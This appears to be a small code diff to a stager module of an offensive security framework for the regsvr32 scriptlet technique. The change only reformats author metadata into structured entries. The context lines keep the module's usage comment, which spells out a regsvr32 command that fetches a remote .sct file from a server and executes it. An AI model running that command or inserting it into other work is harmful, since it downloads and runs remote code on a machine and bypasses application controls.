@@ -10,7 +10,18 @@ class Stager(object):
 
         self.info = {
             "Name": "regsvr32",
-            "Authors": ["@subTee", "@enigma0x3"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@subTee",
+                    "Link": "",
+                },
+                {
+                    "Name": "",
+                    "Handle": "@enigma0x3",
+                    "Link": "",
+                },
+            ],
             "Description": "Generates an sct file (COM Scriptlet) Host this anywhere",
             "Comments": [
                 "On the endpoint simply launch regsvr32 /u /n /s /i:http://server/file.sct scrobj.dll "
